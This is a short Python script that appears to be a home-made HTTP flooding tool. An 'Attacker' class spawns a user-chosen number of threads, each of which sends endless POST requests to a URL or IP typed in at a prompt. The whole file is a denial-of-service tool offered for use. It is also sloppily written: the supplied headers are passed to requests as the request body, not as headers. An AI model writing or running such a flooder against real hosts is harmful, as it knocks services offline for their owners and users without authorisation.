import requests as r
import threading 

class Attacker:
    def __init__(self, Loop_range: int = 0):
        self.loop_range = Loop_range

    def post(self, url: str, headers: dict = {}):
        if self.loop_range == 0:
            r.post(url, headers)
            print(f'Sent request to {url} using Headers: {headers}.')
            return
        else:
            threads = []
            def post_loop():
                while True:
                    r.post(url, headers)
                    print(f'Sent request to {url} using Headers: {headers}.')

            for thread in range(self.loop_range):
                th = threading.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.loop_range): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.loop_range): 
                threads[thread].join()

def Cor():
    url = input("What ip/url do you wanna send requests to?: ")
    headers = input("Headers, dict format: ") 
    loop_range = input("At what rate is requests going to be sent to this endpoint: ")
    if loop_range:
        Attacker(Loop_range=int(loop_range)).post(url, headers)

    Attacker().post(url, headers)
    
if __name__ == "__main__":
    Cor()